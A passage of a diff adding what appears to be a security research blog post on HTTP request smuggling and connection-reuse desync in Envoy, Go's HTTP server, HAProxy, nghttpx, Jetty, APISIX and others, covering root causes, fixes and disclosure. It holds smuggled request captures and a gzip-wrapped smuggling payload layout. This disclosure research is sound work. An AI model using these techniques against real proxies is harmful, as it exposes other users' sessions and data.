+victim per trial crosses, because Go closes a pooled socket on which an
+unsolicited response has already landed.</p>
+<p>On the wire the patched build does two things and only one of them stops the
+crossing. <code>Connection: close</code> on the forwarded CONNECT is the mechanism: built
+on its own it gives 0 of 64 against a backend that refuses the CONNECT and
+0 of 64 against one that answers it <code>200</code>. The zero payload bytes come from a
+second change in the same release, a deferral that holds the body until the
+backend accepts. On its own that does deliver 0 bytes, and a stock
+<code>traefik/whoami</code> still crosses 64 of 64, because it answers the CONNECT with a
+keep-alive <code>200</code> and the deferral releases on any 2xx. With only the header,
+127 payload bytes still arrive and the backend discards them unparsed. The
+commits are <code>94a750881</code>, which introduces <code>pkg/proxy/httputil/connect.go</code>, a
+file that does not exist at v3.6.23, and <code>0807b6d5</code>, which adds the header. FastProxy was never affected: it chunk-frames the payload, so it
+arrives as body content.</p>
+<p><strong>Caddy</strong>, <code>GHSA-xg5r-v2fg-97hh</code>, was dismissed, since Caddy cannot remove the
+behaviour without diverging from the transport it is built on.</p>
+<p><strong>nghttpx</strong>, <code>GHSA-8xjx-55xw-h6h6</code>: <code>push_upload_data_chunk()</code> writes HTTP/2
+DATA to the HTTP/1 backend before acceptance, and an <code>END_STREAM</code> with a <code>405</code>
+and an empty local write buffer satisfies <code>can_detach_downstream_connection()</code>.
+Fixed on 22 May in <code>ab28105c</code> and shipped in 1.70.0 on 29 July. I built both
+releases and drove the attack at each: on 1.69.0 the smuggled DATA reaches the
+backend before acceptance 80 of 80 times and a third of the following victims
+read somebody else’s answer, and on 1.70.0 and current master it reaches the
+backend 0 of 80 while the CONNECT itself still arrives and is still answered
+<code>405</code>. On the fixed build nghttpx closes that socket as soon as the <code>405</code>
+comes back instead of returning it, a median of 0.000 s later against 0.850 s
+on 1.69.0, and no later request lands on it in 80 of 80 cases. The new
+<code>blocked_request_buf_.rleft() == 0</code> clause in
+<code>can_detach_downstream_connection()</code> is why: the unaccepted DATA is still in
+that buffer, so the connection cannot be detached. The project did
+not publish this HTTP/2 CONNECT report. A public entry does exist for a
+different vector fixed by the same commit: <code>CVE-2026-58055</code> /
+<code>GHSA-xrr7-82jr-v58x</code> covers HTTP/1.1 Upgrade with <code>Content-Length</code>, reported
+by a different finder. GitHub’s autogenerated notes carry the combined change as
+one line, “Nghttpx upgrade”. The project’s own 1.70.0 announcement is plainer:
+it says the release “tightens up CONNECT and HTTP Upgrade handling to shut
+down the possibility of the request smuggling attack”.</p>
+<p><strong>Envoy <code>CVE-2026-73548</code></strong> is the one worth sitting with, because Envoy already
+had the invariant. It pauses for plain CONNECT and it pauses for WebSocket. It
+just does not pause for anything else. I ran all three through a single
+1.36.0 process, one bootstrap with <code>CONNECT</code>, <code>websocket</code> and <code>foo</code> all
+enabled, 36 trials interleaved:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>plain CONNECT          12 trials   held 12,  zero DATA bytes upstream</span></span>
+<span class="line"><span>:protocol websocket    12 trials   held 12,  zero DATA bytes upstream</span></span>
+<span class="line"><span>:protocol foo          12 trials   crossed 12</span></span></code></pre>
+<p>Two branches and no third. <code>upstream_request.cc</code> sets <code>paused_for_connect_</code> for
+a CONNECT method and <code>paused_for_websocket_</code> for a WebSocket upgrade. By the
+time the router sees an extended CONNECT, <code>transformUpgradeRequestFromH2toH1</code>
+has rewritten the method to <code>GET</code> and moved <code>:protocol</code> into <code>Upgrade</code>, so the
+first cannot fire, and <code>isWebSocketUpgradeRequest</code> compares the <code>Upgrade</code>
+value against <code>websocket</code> with <code>absl::EqualsIgnoreCase</code>
+(<code>source/common/http/utility.cc:686-690</code>), so the second cannot either. Framing is then disabled in
+<code>codec_impl.cc</code>, and <code>conn_pool.cc</code> pools the socket on <code>encode_complete_</code>
+without asking whether a response is still queued.</p>
+<p>The bytes carry their own provenance:</p>
+<figure class="trc" aria-labelledby="trc-envoy-provenance"><figcaption class="trc__cap" id="trc-envoy-provenance"><span class="trc__capg" aria-hidden="true">▌</span>One upstream socket, and the one unit on it Envoy never parsed</figcaption><div class="trc__stream"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>GET / HTTP/1.1</span></span>
+<span class="line"><span>host: envoy.local</span></span>
+<span class="line"><span>upgrade: foo</span></span>
+<span class="line"><span>connection: upgrade</span></span>
+<span class="line"><span>x-forwarded-proto: https</span></span>
+<span class="line"><span>x-request-id: 2a125618-ff99-401a-8107-c0aae4f587cd</span></span>
+<span class="line"><span>x-envoy-expected-rq-timeout-ms: 30000</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span><mark class="trc__by">GET /slow-marker?d=2.0 HTTP/1.1</mark></span></span>
+<span class="line"><span><mark class="trc__by">Host: envoy.local</mark></span></span>
+<span class="line"><span><mark class="trc__by">X-Smuggled: FCREUSE20261025T090629Z11324217-T7</mark></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span><mark class="trc__vic">GET /account?t=7 HTTP/1.1</mark></span></span>
+<span class="line"><span>host: envoy.local</span></span>
+<span class="line"><span>x-forwarded-proto: https</span></span>
+<span class="line"><span>x-request-id: 4637ba7b-2ed8-46ee-87db-22c141c86818</span></span>
+<span class="line"><span>x-envoy-expected-rq-timeout-ms: 30000</span></span></code></pre></div><p class="trc__key"><span class="trc__ki"><b class="trc__by">attacker</b> bytes that originated with the attacker</span><span class="trc__ki"><b class="trc__vic">victim</b> bytes that originated with the victim</span></p></figure>
+<p>Three request units on one upstream socket, read off the wire between Envoy
+and the origin. The smuggled request keeps the attacker’s capitalisation and
+carries no <code>x-request-id</code>, while both units Envoy proxied are normalised to
+lowercase and tagged. Those bytes never passed through Envoy’s HTTP layer. The
+third unit is the victim’s own request, arriving on the socket that already
+holds them. Across 252 recorded units, 96 smuggled and 156 proxied, there is
+no exception in either direction: every smuggled unit carries exactly <code>Host</code>
+and <code>X-Smuggled</code> and no <code>x-request-id</code> in any case form.</p>
+<p>12 of 12 against Apache 2.4.69 and 12 of 12 against nginx 1.31.6. Removing the
+token gives 0 of 12, with Envoy answering <code>403</code> itself. Disabling upstream
+reuse gives 0 of 12, though Envoy still wrote the DATA every time. The fix is
+one runtime guard, and it isolates without changing binaries: on a single
+1.36.13 image,
+<code>envoy.reloadable_features.http_pause_generic_upgrade_request_body</code> set true
+held 12 of 12, set false on the same digest crossed 12 of 12.</p>
+<p>One bound worth stating: this needs an operator to have configured a
+non-WebSocket upgrade token. Against a WebSocket-only configuration I tried ten
+token encodings over 40 trials, including case variants, whitespace padding and
+<code>websocket,foo</code>, and got zero.</p>
+</details>
+<h2 id="2-unproven-drain-reuse">2. Unproven-drain reuse</h2>
+<p>A connection is reused on evidence that cannot show whether the request body
+was read. The body bytes are still sitting in the receive buffer, so the next
+request to use that connection starts inside them.</p><figure class="dgm"><svg viewBox="0 0 440 262" role="img" aria-label="One question with three possible sources of an answer: two are consulted and answer wrongly, and the receive buffer holding the unread bytes is not consulted."><text x="220" y="14" class="dgm__l dgm__mid">the reuse check asks: was the request body read?</text><text x="220" y="32" class="dgm__s dgm__mid">three things could answer it</text><rect x="8" y="42" width="136" height="56" class="dgm__bx"></rect><text x="76" y="60" class="dgm__s dgm__mid">w.req.Body</text><text x="76" y="74" class="dgm__s dgm__mid">exported, and</text><text x="76" y="88" class="dgm__s dgm__mid">wrapped in practice</text><rect x="152" y="42" width="136" height="56" class="dgm__bx"></rect><text x="220" y="60" class="dgm__s dgm__mid">the native body</text><text x="220" y="74" class="dgm__s dgm__mid">it falls back to,</text><text x="220" y="88" class="dgm__s dgm__mid">already closed</text><rect x="296" y="42" width="136" height="56" class="dgm__bxa"></rect><text x="364" y="60" class="dgm__sa dgm__mid">the receive buffer</text><text x="364" y="74" class="dgm__sa dgm__mid">holding the body</text><text x="364" y="88" class="dgm__sa dgm__mid">bytes, unread</text><text x="76" y="116" class="dgm__s dgm__mid">the assertion</text><text x="76" y="130" class="dgm__s dgm__mid">fails</text><g class="dgm__a"><line x1="76" y1="136" x2="76" y2="146" class="dgm__ln"></line><polygon points="76,152 72.5,145 79.5,145" class="dgm__hd"></polygon></g><text x="220" y="116" class="dgm__s dgm__mid">its error is taken</text><text x="220" y="130" class="dgm__s dgm__mid">for a yes</text><g class="dgm__a"><line x1="220" y1="136" x2="220" y2="146" class="dgm__ln"></line><polygon points="220,152 216.5,145 223.5,145" class="dgm__hd"></polygon></g><g class="dgm__a dgm__a--off"><line x1="340" y1="98" x2="340" y2="132" class="dgm__dl"></line></g><g class="dgm__a dgm__a--off"><line x1="335" y1="136" x2="345" y2="146" class="dgm__ln"></line><line x1="335" y1="146" x2="345" y2="136" class="dgm__ln"></line></g><text x="328" y="145" class="dgm__s dgm__end">not consulted</text><rect x="90" y="152" width="260" height="32" class="dgm__bxo"></rect><text x="220" y="172" class="dgm__s dgm__mid">the check answers: body was read</text><g class="dgm__a"><line x1="220" y1="186" x2="220" y2="206" class="dgm__ln"></line><polygon points="220,212 216.5,205 223.5,205" class="dgm__hd"></polygon></g><text x="232" y="203" class="dgm__s">so the connection is reused</text><rect x="70" y="212" width="300" height="40" class="dgm__bxa"></rect><text x="220" y="232" class="dgm__sa dgm__mid">the next request on it starts</text><text x="220" y="246" class="dgm__sa dgm__mid">inside the unread body bytes</text></svg><figcaption class="dgm__cap" id="dgm-unproven-drain-reuse">Neither thing the check consults is the connection itself.</figcaption></figure>
+<p>Here the evidence is a body field that middleware routinely replaces. In
+the nghttpx and Envoy cases above it is an empty local write buffer or a
+completed local write.</p>
+<p><strong>Go’s HTTP server gets this wrong independently of its client</strong>, and it is the
+half that measured worse for other people. <code>closedRequestBodyEarly()</code> decided
+whether a request was abandoned before its body was read, with a type
+assertion:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="go"><code><span class="line"><span style="color:#E6EDF3">body, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> w.req.Body.(</span><span style="color:#FF7B72">*</span><span style="color:#FFA657">body</span><span style="color:#E6EDF3">)          </span><span style="color:#8B949E">// go1.26.5, server.go:1715-1718</span></span></code></pre>
+<p><code>Request.Body</code> is exported, and middleware wraps or replaces it as a matter of
+course, although Go’s own <code>Handler</code> contract says a handler should not modify
+the request except by reading the body. Any middleware that wraps it, a gzip reader or a tracer or a size limiter, makes that
+assertion fail. The surrounding cleanup, whose job is to read and discard
+whatever the handler left unread, falls to its <code>default</code> branch, reads the
+already-closed native body, and takes <code>ErrBodyReadAfterClose</code> as proof the body
+was consumed. The handler returns early, the wire bytes are still there,
+keep-alive is kept, and the next parse starts inside them.</p>
+<p>This is a server-side defect, and on its own it stays within one client: the
+server’s keep-alive hands the leftover bytes to the next request on the same
+connection, which is the same client’s. It reaches other people when a proxy
+in front pools backend connections across users. That is the arrangement
+measured in the fold below, where 89 of 131 victims behind Caddy received
+another user’s account page.</p>
+<p>A minimal server with body-wrapping middleware, 180 trials across eight
+toolchains. One trial is a request whose body the handler never reads,
+followed by a second request on the same connection, counted as a crossing
+when the second one is parsed out of the first one’s leftover bytes. Each
+figure below is crossings out of trials:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>affected                          fixed</span></span>
+<span class="line"><span>go1.21.13   20 of 20              go1.27.0     0 of 20</span></span>
+<span class="line"><span>go1.24.13   20 of 20              go1.27.1     0 of 20</span></span>
+<span class="line"><span>go1.25.14   20 of 20</span></span>
+<span class="line"><span>go1.26.5    40 of 40</span></span>
+<span class="line"><span>go1.26.7    20 of 20</span></span>
+<span class="line"><span>go1.26.10   20 of 20</span></span></code></pre>
+<p>go1.27.0 replaced three reads of that mutable field with reads of a saved
+native body. The change is
+<a href="https://go-review.googlesource.com/c/go/+/794640">CL 794640</a>, “net/http:
+don’t rely on server request body not changing”, with a regression test called
+<code>TestServerConnectionReuse/large_wrapped_body</code>. <strong>It was not backported to the
+1.26 series.</strong> <code>golang:1.26</code> resolves to go1.26.10, the newest 1.26 patch,
+which still carries the assertion and still crossed 20 of 20.</p>
+<p>I reported this, and Go declined it:</p>
+<blockquote>
+<p>Since this report requires a middleware layer to violate the documented
+requirements of the Handler interface (“Except for reading the body,
+handlers should not modify the provided Request.”), we do not consider it to
+be a security bug. <a href="https://go.dev/cl/794640">https://go.dev/cl/794640</a> addresses this as a hardening
+measure.</p>
+</blockquote>
+<p>The wrapping that argument rests on is the gzip readers, tracers and size
+limiters named above.</p>
+<p>I found the same defect in other shipped products. Those are under coordinated
+disclosure and are not in this post.</p>
+<details>
+<summary>A health check answered with a CPU profile in Prometheus Pushgateway, and 89 of 131 victims reading another user's account page in a second service.</summary>
+<p>Four controls on that same minimal server, 160 trials, and nothing crossed in
+any of them, on either toolchain. The handler closes the native body rather than the wrapper the
+middleware put round it. The handler reads the body all the way to the end.
+The attacker’s own request, the one carrying the smuggled bytes in its body,
+sends <code>Connection: close</code>. And that body is 200,000 bytes, under Go’s
+262,144-byte <code>maxPostHandlerReadBytes</code> threshold.</p>
+<p>That last one has its reason in the source. <code>(*body).Close</code> records an early
+close only when more than the threshold is still unread; under it, the
+remaining bytes are drained instead, so none are left on the connection
+(<code>transfer.go:987-1002</code> on the 1.26 line these controls ran against; go1.27
+rewrote that block and it sits at <code>:1002-1018</code> there).</p>
+<p><strong>In a shipped binary.</strong> Prometheus Pushgateway 1.11.3, built with go1.26.3,
+behind HAProxy with <code>http-reuse always</code>. One valid gzip POST to a route that
+404s, <code>Content-Length: 324242</code>, with the inner request at body offset 4,096
+inside stored DEFLATE blocks. A stored block holds its bytes uncompressed, so
+the smuggled request arrives at the socket as readable text while the whole body
+stays a valid gzip stream:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>1f 8b 08 00 00 00 00 00 00 ff    gzip, DEFLATE, no flags, mtime 0, OS 255</span></span>
+<span class="line"><span>00 ec 0f 13 f0                   stored block, BFINAL=0 BTYPE=00, LEN=0x0fec</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>00 ff ff 00 00                    second stored block, LEN=0xffff</span></span>
+<span class="line"><span>GET /debug/pprof/profile?seconds=3 HTTP/1.1</span></span>
+<span class="line"><span>Host: pushgateway</span></span>
+<span class="line"><span>Content-Length: 0000320028</span></span></code></pre>
+<p>A victim whose only request was <code>GET /-/healthy</code> received a real pprof CPU
+profile, its string table holding <code>/bin/pushgateway</code>, <code>samples</code>, <code>cpu</code> and
+<code>nanoseconds</code>, delivered in 2.956 s, matching the inner <code>?seconds=3</code>. Five of
+five, with <code>http-reuse never</code>, identity encoding, a sub-threshold filler and a
+no-attack arm all at zero.</p>
+<p>HAProxy’s own log puts it more precisely than I can. A genuine health check on
+this build logs <code>200 121</code> in 0 ms; the crossings log <code>200 449</code> in about
+2,960 ms. And in the backend capture, across ten trials HAProxy wrote the
+victim’s <code>GET /-/healthy</code> to Pushgateway exactly <strong>once</strong>, and that one write
+was the single trial that did not cross. In the other nine the victim’s request
+never reached the application at all. The miss was a retry: HAProxy abandoned
+the poisoned pooled connection and opened a fresh one.</p>
+<p><strong>The rebuild is the whole fix.</strong> 1.11.4 ships built with go1.27.1 and crossed
+0 of 10, but upstream bumped dependencies in the same release, so that moves
+two variables. The matched pair moves one: <code>pushgateway@v1.11.3</code>, module graph
+pinned by its own <code>go.mod</code>, under two toolchains.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>v1.11.3 source, built go1.26.7     10 of 10 crossed</span></span>
+<span class="line"><span>v1.11.3 source, built go1.27.0      0 of 10</span></span></code></pre>
+<p><strong>What it does to other users.</strong> This arm is not Pushgateway. It is a small
+authenticated Go service with the same wrapped-body middleware, behind three
+stock proxies, 131 victim requests on a Poisson schedule. All three hold their
+backend pool at one connection, the same lab setting as the Pushgateway arm
+above: <code>max_conns_per_host 1</code> in Caddy, <code>max_conns=1</code> with <code>keepalive 1</code> in
+nginx, <code>maxconn 1</code> on the HAProxy server line. That pin makes a run this small
+deterministic, and it is also why two of these rows only mean anything beside
+a control.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Caddy,   reuse on,  go1.26.5    89 of 131 received another user's account page</span></span>
+<span class="line"><span>nginx,   reuse on,  go1.26.5     0 of 131 crossed; its 82 502s are max_conns=1</span></span>
+<span class="line"><span>HAProxy, reuse on,  go1.26.5     2 of 131 injected; its 30 503s are maxconn 1</span></span>
+<span class="line"><span>Caddy,   reuse off, go1.26.5     0 of 131, on 133 separate backend connections</span></span>
+<span class="line"><span>Caddy,   reuse on,  go1.27.0     0 of 131</span></span></code></pre>
+<p>I ran the same victim schedule twice more, once with no attacker at all and
+once with a benign attacker that holds the single permitted connection for the
+same three seconds without smuggling anything:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>                   attack      no attacker   benign occupancy</span></span>
+<span class="line"><span>Caddy  disclosures  89 of 131     0 of 131       0 of 131</span></span>
+<span class="line"><span>nginx  502          82 of 131    82 of 131     104 of 131</span></span>
+<span class="line"><span>HAProxy 503         30 of 131     4 of 131      34 of 131</span></span>
+<span class="line"><span>HAProxy injected     2 of 131     0 of 131       0 of 131</span></span></code></pre>
+<p>So only the Caddy disclosures and the two HAProxy injections are the defect.
+nginx’s 82 is <code>max_conns=1</code>: when its one permitted upstream connection is
+busy nginx does not queue, it logs <code>no live upstreams</code> and returns 502, and it
+did that to the attacker too. In all eight pinned nginx runs the smuggled
+request never reached the backend at all. HAProxy’s 503 column is the same
+effect with a different trigger, since both smuggled requests ask for a
+1,500 ms delay and two ordinary slow requests cause more 503s than the attack
+does. The two injected responses are real, because an attacker-chosen body
+cannot arrive without the smuggled request having run.</p>
+<p>Take the pin out and change nothing else, and the same attack reaches two
+victims behind Caddy, two behind HAProxy and none behind nginx. Pinning the
+pool does not decide whether the socket gets poisoned. It decides how many
+people are routed back onto it.</p>
+<p>One of those 89, verbatim: a victim authenticated as <code>bob</code> received
+<code>PRIVATE_ACCOUNT user=frank api_key=AK-frank-3ee94c18 balance=$9,845.73</code>.</p>
+</details>
+<h2 id="3-promise-credited-framing">3. Promise-credited framing</h2>
+<p>A proxy takes the framing it announces, a <code>Content-Length</code>, a chunk size or a
+<code>Transfer-Encoding</code>, from the request it received instead of from the bytes it
+forwards. The backend then looks for the end of the body in the wrong place.</p><figure class="dgm"><svg viewBox="0 0 440 206" role="img" aria-label="A byte ledger over one chunk: 100 announced, 50 in hand, 5 swallowed, 45 owed."><text x="220" y="30" class="dgm__la dgm__mid">64 announced = 100 bytes</text><g class="dgm__a dgm__a--att"><line x1="40" y1="38" x2="400" y2="38" class="dgm__ln"></line><line x1="40" y1="38" x2="40" y2="46" class="dgm__ln"></line><line x1="400" y1="38" x2="400" y2="46" class="dgm__ln"></line></g><rect x="40" y="56" width="180" height="30" class="dgm__bxa"></rect><text x="130" y="75" class="dgm__sa dgm__mid">50 bytes in hand</text><rect x="220" y="56" width="18" height="30" class="dgm__bxp"></rect><rect x="238" y="56" width="162" height="30" class="dgm__bxv"></rect><text x="319" y="75" class="dgm__sv dgm__mid">45 still owed</text><g class="dgm__a"><line x1="229" y1="86" x2="229" y2="98" class="dgm__ln"></line><polygon points="229,104 225.5,97 232.5,97" class="dgm__hd"></polygon></g><text x="229" y="118" class="dgm__l dgm__mid">0\r\n\r\n</text><text x="229" y="132" class="dgm__s dgm__mid">read as 5 bytes of data</text><text x="319" y="154" class="dgm__lv dgm__mid">taken from whoever has</text><text x="319" y="168" class="dgm__lv dgm__mid">the connection next</text><text x="130" y="176" class="dgm__s dgm__mid">3.2.21 emits 32 = 50</text><g class="dgm__a"><line x1="40" y1="192" x2="220" y2="192" class="dgm__ln"></line><line x1="40" y1="192" x2="40" y2="184" class="dgm__ln"></line><line x1="220" y1="192" x2="220" y2="184" class="dgm__ln"></line></g></svg><figcaption class="dgm__cap" id="dgm-promise-credited-framing">The chunk size HAProxy opens with is the length the client declared, so its own terminator lands 50 bytes short of where the backend is counting, and the backend reads those five bytes as more of the body.</figcaption></figure>
+<p>HAProxy <code>CVE-2026-90678</code> does it where an HTTP/3 request is translated into
+HTTP/1 for the backend. A POST with no <code>Content-Length</code> carries a DATA frame
+header declaring 100 bytes; only 50 arrive, then a standalone QUIC FIN in its
+own packet. Arriving alone, with no data beside it, the FIN takes a frame-level
+path that checks the body size only when a <code>Content-Length</code> was parsed, and this
+request has none. HAProxy emits:</p>
+<figure class="trc" aria-labelledby="trc-haproxy-over-announce"><figcaption class="trc__cap" id="trc-haproxy-over-announce"><span class="trc__capg" aria-hidden="true">▌</span>The size HAProxy announced, and what the backend counts</figcaption><div class="trc__stream"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>POST <mark class="trc__by">/probe/b33b2954a71a36b7</mark> HTTP/1.1</span></span>
+<span class="line"><span>transfer-encoding: chunked</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span><mark class="trc__by">64</mark></span></span>
+<span class="line"><span><mark class="trc__by">FAM3-ATK-b33b2954a71a36b7-FAM3-ATK-b33b2954a71a36b</mark>0</span></span>
+<span class="line"><span></span></span></code></pre></div><div class="trc__fork"><p class="trc__forkh">The next five bytes, read twice</p><ul class="trc__forkl"><li class="trc__branch"><span class="trc__brg" aria-hidden="true">├─</span><span class="trc__brb"><b class="trc__brw">HAProxy</b> writes 0\r\n\r\n. Chunk closed, exchange finished, connection pooled.</span></li><li class="trc__branch"><span class="trc__brg" aria-hidden="true">└─</span><span class="trc__brb"><b class="trc__brw">The backend</b> is 50 short, so it counts those five as chunk data. 55 of 100, waiting on 45, taken from whoever has the connection next.</span></li></ul></div><p class="trc__key"><span class="trc__ki"><b class="trc__by">attacker</b> bytes that originated with the attacker</span></p></figure>
+<p><code>64</code> is 100 in hexadecimal: the length the client <em>declared</em>, not the 50 bytes
+HAProxy actually has. It has just told the backend to expect twice what it is
+about to send.</p>
+<p>It then makes the second mistake. Having run out of body, it writes the
+end-of-body marker, <code>0\r\n\r\n</code>. But the backend is still 50 bytes short of
+the chunk it was promised, so it does not read that as a marker at all. It
+counts those five bytes as five more bytes of chunk data, reaching 55 of 100,
+and goes on waiting for the remaining 45. A clean 3.2.21 emits <code>32</code>, which is
+50, and the marker lands where a marker should.</p>
+<p>Those 45 bytes come from whoever uses the connection next. In one run they
+were the victim’s own request line, read as chunk data for somebody else’s
+body. The victim was on a separate QUIC connection, and got back a <code>200</code> that
+reported the method and target the backend had parsed, neither of which it had
+asked for. The target came from the attacker’s run. The method was the victim’s
+own header line, <code>x-fam3-run:</code>, read as if it were a method.</p>
+<p>Over-announced emissions, by version:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>3.3.17   30 of 30      3.2.21    0 of 30</span></span>
+<span class="line"><span>3.4.2    30 of 30      3.2.26    0 of 30</span></span>
+<span class="line"><span>3.4.4    30 of 30</span></span>
+<span class="line"><span>3.4.6    30 of 30</span></span></code></pre>
+<p>Those counts are emissions of the wrong length and not crossings: of the six
+versions, the wrong length went on to cross between clients on 3.4.2 and 3.4.4
+only. The two clean versions carry none of the internal plumbing that passes a
+declared length from one protocol layer to the next, so their serializer can
+only use what it is holding. On 3.4.4 the take rate is every opportunity: an
+over-announced emission with another request behind it on the same backend
+socket had those bytes swallowed every time, in two runs on different days. It
+takes exactly 45 bytes each time, with no variance in either run. Which client
+that lands on is a pool matter rather than a property of the defect. Most of
+the crossings ate a victim’s request line; the rest ate the attacker’s own
+next request, which spends the desync on its author. The proportions move
+between runs because the pool decides which request is next, so they are a
+fact about my lab rather than about anyone’s traffic.</p>
+<p>The crossing also needs an origin that answers before it reads the body it was
+promised. Against an origin that reads first, the same build still
+over-announces 30 of 30 and crosses 0 of 60. The framing defect does not
+depend on the origin; reaching another user with it does.</p>
+<details>
+<summary>Reuse off leaves the wrong length on the wire. Versions above the fix still over-announce. Jetty and APISIX share the defect.</summary>
+<p><strong>Why it happened.</strong> 3.4.4 checks the body size on the standalone-FIN path
+only when a <code>Content-Length</code> header was parsed. This request has none, so
+nothing compares the bytes that arrived against the length the client
+declared, and the serializer prints the declared one.</p>
+<p><strong>Reuse is not what makes it wrong.</strong> With <code>http-reuse never</code> the serializer
+still over-announces 30 of 30 and nothing crosses, because 91 requests got 91
+backend connections. The wrong number goes out either way; the pool only
+decides whether anyone else is there to receive the consequences.</p>
+<p><strong>Upstream.</strong> Three commits on 2026-09-03 closed it. <code>86a4ebc</code> closes the
+connection with <code>H3_FRAME_ERROR</code> when a FIN arrives on a frame still short of
+its declared length, which is after anything already forwarded. <code>4721a96f</code>
+stops a connection still owing body bytes from going back into the pool, and
+<code>6f59a49</code> refuses to write trailers or the final zero chunk while an earlier
+chunk is unfinished. All three reached stable users in 3.3.15 and 3.4.5 on
+2026-09-24, where the changelog line is <code>BUG/MAJOR: h3: reject H3 truncated frames</code>.</p>
+<p><strong>Above the fixed releases.</strong> 3.3.17 still over-announces 30 of 30, and so
+does 3.4.6, while crossing 0 of 60. The guard fires, and it fires late: the
+<code>64</code> reaches the backend a median 2.6 ms after the short DATA frame and a
+median 78.5 ms before the FIN that rejects it, on 30 of 30 shots, and the
+backend’s read then fails 0.1 ms after that FIN. So it emits the same <code>64</code>,
+writes no terminator, and closes the connection instead of returning it to
+the pool, which is what its log’s <code>CL--</code> termination flag records. With
+nothing pooled there is no next user to hand the leftovers to. 3.2.26
+isolates the guard on its own: it announces the correct <code>32</code> and still writes
+no terminator, where 3.2.21, which differs from it by that one commit, writes
+both.</p>
+<p>One qualifier on that 30 of 30. The <code>64</code> only escapes if the request head and
+the short DATA frame are in flight together, because that is when HAProxy
+writes them to the backend in one pass. A client that flushes the head first
+and the DATA frame 150 ms later gets nothing out of a fixed release: 3.3.17,
+3.4.6 and 3.2.26 each emitted no chunk-size line at all in that variant, 0 of
+3, while 3.4.4 emitted <code>64</code> 3 of 3 beside them. Above the fix this is still a
+framing bug, but it is one in a race the attacker has to win.</p>
+<p><strong>Jetty 12.1.11’s HTTP/3 <code>ProxyHandler</code></strong> is the same family reached a
+different way. A POST declares <code>content-length: 4</code> and sends 78 DATA bytes:
+<code>AAAA</code> followed by a complete 74-byte request. Jetty forwards all 78 while
+announcing 4. <code>ChannelRequest.getLength()</code> returns the declared header value
+regardless of how many bytes arrive, and <code>HttpGenerator.committed()</code> writes
+what it is handed without comparing against it.</p>
+<p>Surplus forwarded 20 of 20, second request parsed at the origin 20 of 20,
+victims hurt 20 of 20 opportunities. Apache httpd behind a byte recorder
+confirms it independently: its own access log shows the smuggled <code>GET</code> as a
+later keep-alive request on the same connection as the POST, taking the 2.5 s
+the smuggled request asked for. The control changes one header value and
+nothing else: <code>content-length: 78</code> for the same 78 bytes gives zero across
+every column, and carries 42 requests rather than the baseline’s 62, which is
+exactly the 20 smuggled requests it never forwards.</p>
+<p>Reuse is the amplifier here too. With Jetty’s own backend pool at
+<code>maxUsage=1</code>, so that each connection serves one exchange and is then closed,
+the surplus is still forwarded 20 of 20 and the origin still parses the
+smuggled request 20 of 20, while crossings go to 0 of 20 and all 20 victims
+read their own page. The same rig’s baseline carried its 62 origin requests
+on one backend connection and hurt 20 of 20 victims; at <code>maxUsage=1</code> the same
+traffic takes 42, and those 42 split in a way a bare zero would hide: the 20 that carried an attacker POST also carried the smuggled
+<code>GET</code> it created, one keep-alive request later on the same source port
+(<code>kacount=1</code> in Apache’s log), and that set and the victims’ connections do not
+overlap at all. The attacker still poisons a socket. It is only ever its own.</p>
+<p>The same Jetty process refuses this over HTTP/2. <code>HTTP2Stream</code> tracks a
+<code>dataLength</code> against the declared value and resets the stream on a mismatch,
+and all 20 shots got <code>PROTOCOL_ERROR</code> with the body never forwarded.
+<code>HTTP3Stream</code> has no references to <code>dataLength</code> at all. Jetty accepted this as
+a bug and declined both a CVE and an advisory, because its H3 connector is
+experimental.</p>
+<p><strong>APISIX 3.16.0</strong> reaches the same place from the other direction. Not a length
+that is too large, but a coding that no longer applies. nginx de-chunks the
+client’s body before the Lua layer sees it, and <code>generic-upstream.lua:63</code>
+copies the client’s <code>Transfer-Encoding: chunked</code> onto the upstream request
+anyway. <code>api7-lua-resty-http</code> 0.2.3 is then handed a plain string carrying a
+chunked header, suppresses <code>Content-Length</code>, and writes the string raw. That
+string is the attacker’s body after nginx has de-chunked it, and it begins with
+the literal bytes <code>0\r\n\r\n</code>, which the attacker put there as content rather
+than framing. Apache 2.4.68 on its default keep-alive config reads them as the
+terminating chunk and parses what follows, a complete <code>GET /slow?d=2.0</code>, as a
+second request.</p>
+<p>5 of 5 at <code>worker_processes 1</code>; 5 of 24 at the shipped four workers, where the
+per-worker cosocket pools decide which worker is holding the poisoned
+connection. Three controls at zero: backend <code>KeepAlive Off</code>, plugin
+<code>keepalive: false</code>, and a native <code>proxy_pass</code> route, where nginx reframes the
+body itself. The backend’s own access log carries it on one socket, <code>kacount=0</code>
+for the POST and <code>kacount=1</code> for the smuggled <code>GET /slow</code>, followed by the
+victim’s <code>GET /fn</code>. The victim container, at a different address, received
+<code>ATTACKER_SMUGGLED_MARKER</code> in place of its own <code>FUNCTION_OK</code>.</p>
